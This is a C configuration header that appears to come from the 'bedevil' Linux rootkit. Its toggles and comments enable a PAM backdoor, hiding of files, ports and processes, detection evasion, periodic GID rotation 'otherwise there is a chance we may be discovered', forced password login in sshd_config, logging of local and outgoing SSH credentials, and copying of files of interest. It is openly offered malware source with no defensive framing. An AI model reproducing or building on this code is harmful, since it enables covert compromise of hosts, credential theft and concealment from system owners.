/*
 * `./bedevil.sh -t` will allow you to switch these toggles without editing
 * the file manually. lines suffixed with '//ignore' are ignored by toggles.sh.
 */


#ifndef TOGGLES_H
#define TOGGLES_H


/* requires PAM */
#define USE_PAM_BD

/* all of the essential presence hiding toggles are ignored... */
#define HIDE_SELF //ignore
#define FORGE_MAPS //ignore
#define HIDE_PORTS //ignore
#define DO_REINSTALL //ignore
#define DO_EVASIONS //ignore


/* the magic GID will not be a static value. there are backdoor commands
 * available for refreshing the rootkit's current GID & subsequently rehiding
 * its files.
 *
 * files you have personally created that do not technically belong to the
 * rootkit will not be rehidden. if i discover a way of efficiently & sanely
 * keeping track of files created (by you) in the backdoor then great. until
 * then this will continue to be the way it is.
 *
 * if the file cannot be read for whatever reason, the original (MAGIC_GID)
 * value will be used instead.. if this is the case, should rootkit files need
 * rehidden due to GID changes, that will be handled. */
#define READ_GID_FROM_FILE

/* change the rootkit GID every minimum of GID_CHANGE_MINTIME seconds.
 * the GID will not be changed if rootkit processes are still running.
 * otherwise there is a chance we may be discovered. */
#define AUTO_GID_CHANGER
#define GID_CHANGE_MINTIME 60 * 30 // change GID at least every 30 mins.


/* for use with USE_PAM_BD. makes sure UsePAM & PasswordAuthentication
 * stay enabled on the box's sshd_config. */
#define PATCH_SSHD_CONFIG


/* this defines whether or not the `./bdv` command is accessible from within
 * a backdoor shell. there are a host of utilities available from this command.
 *
 * paths can be hidden & unhidden by using `./bdv hide/unhide <path>`.
 * a normal & unhidden shell can be spawned by using `./bdv unhideself`.
 *   this will just spawn /bin/sh as regular root.
 * if READ_GID_FROM_FILE is enabled, you can use `./bdv changegid` to change
 * the rootkit's current magic GID.
 * of course these functionalities are absolutely useless without HIDE_SELF. */
#define BACKDOOR_UTIL //ignore

/* the rootkit will set the magic environment variable in the unhidden process
 * spawned by `./bdv unhideself`. for reasons that don't really need explaining.
 * viewing the process' exported environment variables will however reveal that
 * the magic environment variable is present in the process. */
#define SET_MAGIC_ENV_UNHIDE

/* allows easier access to package managers from within a backdoor shell.
 * requires BACKDOOR_UTIL. supports apt, yum, pacman & emerge. thought it's
 * not hard to add support for others. just add them in inc/hooks/exec/exec.h */
#define BACKDOOR_PKGMAN


/* requires PAM. logs successful user authentications by hooking
 * the pam_prompt functions and writing respective user credentials
 * to the determined log file. */
#define LOG_LOCAL_AUTH

/* when this is defined, outgoing ssh login attempts are logged.
 * the host, username and password used are written to the log.
 * you can read this log file from in your installation directory. */
#define LOG_SSH


/* when this is defined, files opened by open and fopen
 * are copied to INTEREST_DIR.
 * the files that are of interest to us are defined in
 * hooks/open/char_arrays. */
#define FILE_STEAL
/* when this is defined w/ FILE_STEAL, when an attempt to
 * steal a file by copying it to its new path fails,
 * attempt to make a new link in the interesting dir for
 * it instead. i would personally discourage using this
 * but it's here anyway... */
#undef LINK_IF_ERR //ignore


#define USE_CRYPT //ignore


#endif
